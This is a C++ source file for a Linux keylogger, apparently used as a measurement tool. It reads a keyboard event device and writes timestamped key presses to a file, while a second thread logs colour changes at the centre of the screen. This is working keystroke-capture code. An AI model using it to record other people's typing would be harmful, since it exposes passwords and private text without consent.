/*
Adapted from theju/linux-keylogger
*/

#include <iostream>
#include <set>
#include <utility>
#include <search.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>
#include <sys/epoll.h>
#include <signal.h>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <math.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>

#define MAX_EVENTS 100
#define MAXKEYS 104

using namespace std;

FILE *pFile;

void CTRL_C_Handler(int);

class KeyLogger
{
private:
  int fd, efd, cfg, ret;
  char *temp;
  ENTRY ep, *search_result;
  struct input_event ev;
  struct epoll_event ee, *events;
  struct code2keymap
  {
    const char *code;
    const char *keyname;
  };

public:
  KeyLogger(int argc, char **argv)
  {
    struct code2keymap c2k[] = {
        "0",
        "[RESERVED]",
        "1",
        "[ESC]",
        "2",
        "1",
        "3",
        "2",
        "4",
        "3",
        "5",
        "4",
        "6",
        "5",
        "7",
        "6",
        "8",
        "7",
        "9",
        "8",
        "10",
        "9",
        "11",
        "0",
        "12",
        "-",
        "13",
        "=",
        "14",
        "[BACKSPACE]",
        "15",
        "[TAB]",
        "16",
        "q",
        "17",
        "w",
        "18",
        "e",
        "19",
        "r",
        "20",
        "t",
        "21",
        "y",
        "22",
        "u",
        "23",
        "i",
        "24",
        "o",
        "25",
        "p",
        "26",
        "[",
        "27",
        "]",
        "28",
        "[ENTER]",
        "29",
        "[LEFT_CTRL]",
        "30",
        "a",
        "31",
        "s",
        "32",
        "d",
        "33",
        "f",
        "34",
        "g",
        "35",
        "h",
        "36",
        "j",
        "37",
        "k",
        "38",
        "l",
        "39",
        ";",
        "40",
        "KEY_APOSTROPHE",
        "41",
        "KEY_GRAVE",
        "42",
        "[LEFT_SHIFT]",
        "43",
        "\\",
        "44",
        "z",
        "45",
        "x",
        "46",
        "c",
        "47",
        "v",
        "48",
        "b",
        "49",
        "n",
        "50",
        "m",
        "51",
        ",",
        "52",
        ".",
        "53",
        "/",
        "54",
        "[RIGHT_SHIFT]",
        "55",
        "*",
        "56",
        "[LEFT_ALT]",
        "57",
        "[SPACE]",
        "58",
        "[CAPS_LOCK]",
        "59",
        "[F1]",
        "60",
        "[F2]",
        "61",
        "[F3]",
        "62",
        "[F4]",
        "63",
        "[F5]",
        "64",
        "[F6]",
        "65",
        "[F7]",
        "66",
        "[F8]",
        "67",
        "[F9]",
        "68",
        "[F10]",
        "69",
        "[NUMLOCK]",
        "70",
        "[SCROLLLOCK]",
        "71",
        "[KP7]",
        "72",
        "[KP8]",
        "73",
        "[KP9]",
        "74",
        "[KPMINUS]",
        "75",
        "[KP4]",
        "76",
        "[KP5]",
        "77",
        "[KP6]",
        "78",
        "[KPPLUS]",
        "79",
        "[KP1]",
        "80",
        "[KP2]",
        "81",
        "[KP3]",
        "82",
        "[KP0]",
        "83",
        "[KPDOT]",
        "87",
        "[F11]",
        "88",
        "[F12]",
        "96",
        "[KPENTER]",
        "97",
        "[RIGHT_CTRL]",
        "98",
        "[KPSLASH]",
        "99",
        "[SYSRQ]",
        "100",
        "[RIGHTALT]",
        "101",
        "[LINEFEED]",
        "102",
        "[HOME]",
        "103",
        "[UP]",
        "104",
        "[PAGEUP]",
        "105",
        "[LEFT]",
        "106",
        "[RIGHT]",
        "107",
        "[END]",
        "108",
        "[DOWN]",
        "109",
        "[PAGEDOWN]",
        "110",
        "[INSERT]",
        "111",
        "[DELETE]",
        "117",
        "[KPEQUAL]",
        "118",
        "[KPPLUSMINUS]",
        "119",
        "[PAUSE]",
    };

    if (argc != 3)
    {
      cerr << "usage: " << argv[0] << " event-device output-file - probably /dev/input/evdev0" << endl;
      exit(1);
    }

    if ((fd = open(argv[1], O_RDONLY | O_NOCTTY)) < 0)
    {
      cerr << "evdev open: " << strerror(errno) << endl;
      exit(1);
    }

    if (hcreate(MAXKEYS) == 0)
    {
      cerr << "HSEARCH: " << strerror(errno) << endl;
      exit(1);
    }

    for (int i = 0; i < MAXKEYS; i++)
    {
      ep.key = (char *)c2k[i].code;
      ep.data = (void *)c2k[i].keyname;
      if (hsearch(ep, ENTER) == NULL)
      {
        cerr << "HSEARCH: " << strerror(errno) << endl;
        exit(1);
      }
    }

    if ((efd = epoll_create(sizeof(fd))) < 0)
    {
      cerr << "epoll_create: " << strerror(errno) << endl;
      exit(1);
    }

    ee.events = EPOLLIN;
    if ((cfg = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ee)) < 0)
    {
      cerr << "epoll_ctl: " << strerror(errno) << endl;
      exit(1);
    }
  }

  void log()
  {
    signal(SIGINT, CTRL_C_Handler);
    while (1)
    {
      ret = epoll_wait(efd, &ee, MAX_EVENTS, -1);
      if (ret < 0)
        cerr << "epoll_wait: " << strerror(errno) << endl;

      if (read(fd, &ev, sizeof(ev)) < 0)
      {
        cerr << "read: " << strerror(errno) << endl;
        exit(1);
      }
      if (ev.type != EV_KEY)
        continue; // ignore events that aren't from the keyboard
      temp = (char *)malloc(sizeof(int));
      sprintf(temp, "%d", ev.code);
      ep.key = temp;
      search_result = hsearch(ep, FIND);
      free(temp);
      if (search_result)
      {
        if (ev.value != 0) // Ignore if key is being released
        {
          // get time
          unsigned long long now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
          if (fprintf(pFile, "%llu,%s\n", now, (char *)search_result->data) < 0)
          {
            cerr << "pFile write: " << strerror(errno) << endl;
            exit(1);
          }
          fflush(pFile);
        }
      }
    }

    close(efd);
    close(fd);
    fclose(pFile);

    exit(0);
  }
};

XColor getPixelColor(Display *display, int x, int y)
{
  XColor pixel_color;
  Window root = XRootWindow(display, XDefaultScreen(display));
  XMapRaised(display, root);
  XImage *screen_image = XGetImage(
      display,
      root,
      x, y,
      1, 1,
      AllPlanes,
      XYPixmap);
  pixel_color.pixel = XGetPixel(screen_image, 0, 0);
  XFree(screen_image);
  XQueryColor(display, XDefaultColormap(display, XDefaultScreen(display)), &pixel_color);

  return pixel_color;
}

void colorThread()
{

  double prev_r, prev_g, prev_b = 0;
  while (true)
  {
    Display *display = XOpenDisplay(NULL);
    // get center of screen
    int x = XDisplayWidth(display, XDefaultScreen(display)) / 2;
    int y = XDisplayHeight(display, XDefaultScreen(display)) / 2;
    // get color of pixel at center of screen
    XColor screen_pixel_color = getPixelColor(display, x, y);
    int _red = round(screen_pixel_color.red / 256.0);
    int _green = round(screen_pixel_color.green / 256.0);
    int _blue = round(screen_pixel_color.blue / 256.0);

    double colorDistance = sqrt(pow(_red - prev_r, 2) + pow(_green - prev_g, 2) + pow(_blue - prev_b, 2));

    if (colorDistance > 10)
    {
      // get time
      unsigned long long now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
      if (fprintf(pFile, "%llu,[Color Change: %d %d %d]\n", now, _red, _green, _blue) < 0)
      {
        cerr << "pFile write: " << strerror(errno) << endl;
        exit(1);
      }
      fflush(pFile);
      // std::cout << "Color: " << _red << "," << _green << "," << _blue << std::endl;
      prev_r = _red;
      prev_g = _green;
      prev_b = _blue;
    }
    XCloseDisplay(display);
  }
}

KeyLogger *keylogger;

int main(int argc, char **argv)
{
  if (!(pFile = fopen(argv[2], "a")))
  {
    cerr << "od open: " << strerror(errno) << endl;
    exit(1);
  }

  //Start reading color
  std::thread t1(colorThread);

  keylogger = new KeyLogger(argc, argv);
  keylogger->log();

  t1.join();

  exit(-1);
}

void CTRL_C_Handler(int sig)
{
  delete keylogger;
  exit(0);
}